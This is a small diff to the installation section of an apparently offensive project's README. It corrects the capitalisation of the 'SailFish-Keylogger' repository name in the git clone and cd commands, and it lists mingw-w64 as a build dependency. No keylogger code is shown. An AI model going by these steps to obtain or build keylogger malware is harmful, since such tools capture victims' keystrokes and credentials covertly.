@@ -26,8 +26,8 @@ Installation
 
 ```
 #dowland
-git clone https://github.com/hackpatato/SailFish-keylogger.git
-cd SailFish-keylogger
+git clone https://github.com/hackpatato/SailFish-Keylogger.git
+cd SailFish-Keylogger
 #for debian
 sudo apt install mingw-w64
 #for arch
